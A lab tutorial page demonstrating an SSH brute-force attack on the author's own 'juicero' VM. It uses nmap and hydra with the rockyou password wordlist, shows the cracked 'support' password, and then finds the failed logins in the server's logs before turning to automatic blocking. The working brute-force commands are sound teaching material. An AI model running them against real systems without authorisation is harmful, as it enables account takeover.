---
title: 02 Hydra
type: docs
---

The Kali Linux OS on `hacker` comes with many popular penetration applications. You can use them to investigate the `juicero` server for avaiable services.

Using the SSH service available on `juicero` from the `sysadmin` VM helps make it easier for me to manage the server. I can open a terminal, connect via SSH, and run a few commands to change the `juicero` server's configuration.

I assumed the other VMs would just access the Juice Shop web application at port 80, because I didn't put a link advertising the open SSH service on `juicero`. Because I thought 99% of users don't know what SSH is, or how servers use TCP port 22 to allow SSH access, I assumed it's safe to leave it open as long as I never referred to it with a link or document. This is an example of ["security through obscurity"](https://en.wikipedia.org/wiki/Security_through_obscurity) And changing the port number used by SSH is still using obscurity.

## hacker Does SSH Brute Force
A common network scanning tool is [nmap](https://nmap.org/). This can scan a host for open ports, and is included in the Kali Linux VM image downloaded as one of the many pre-installed packages.

They can check if the SSH port 22/TCP is open on `juicero`:
```
nmap -p22 juicero
```

Next, the [hydra](https://en.wikipedia.org/wiki/Hydra_(software)) login cracker tool can be used. It can use a large list of possible passwords and attempt to ["brute-force"](https://en.wikipedia.org/wiki/Brute-force_attack) gain access to the open SSH service.

In the `/usr/share/wordlists/` directory of `hacker` is a large compressed file called `/usr/share/wordlists/rockyou.txt.gz`. This can be extracted:
```
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

This `rockyou.txt` file is a 134 MB text file containing commonly used passwords. And the `hydra` tool can use that huge "wordlist" to attempt SSH logins on the `juicero` server.

To demonstrate how it can be used, I'll SSH from `sysadmin` into the `juicero` server, and create a new user called `support`:
```
sudo useradd support
```

I'll give it one of the passwords near the beginning of the `rockyou.txt` file, "babygirl":
```
sudo passwd support
```
This will give the warning message:
```
BAD PASSWORD: The password fails the dictionary check - it is based on a dictionary word
```

Then, on the `hacker` VM, I run `hydra` using that new user's name, `support`, and that wordlist, `rockyou.txt`:
```
hydra -l support -P /usr/share/wordlists/rockyou.txt ssh://juicero
```

Because it's a very common password, it's near the top of the wordlist (the 13th line) and only takes about 20 seconds. The output is:
```
[22][ssh] host: juicero   login: support   password: babygirl
1 of 1 target successfully completed, 1 valid password found
```

I can see evidence of the multiple failed SSH login attempts on `juicero` if I look in the `/var/log/secure` file. I can print the last 100 lines of that file, that contain the text "support" (the username I used with the `hydra` login cracker):
```
sudo tail -100 /var/log/secure | grep support
```

The output is:
```
Jan  1 22:43:58 juicero sshd[4636]: Failed password for support from 192.168.122.226 port 39510 ssh2
Jan  1 22:43:58 juicero sshd[4628]: Failed password for support from 192.168.122.226 port 39430 ssh2
Jan  1 22:44:00 juicero sshd[4630]: Connection closed by authenticating user support 192.168.122.226 port 39460 [preauth]
Jan  1 22:44:00 juicero sshd[4630]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.122.226  user=support
```

I think that multiple failed login attempts like this are usually a sign of a brute force attack. Next, I'll use software that monitors for this and automatically blocks the IP address making the failed SSH login attempts.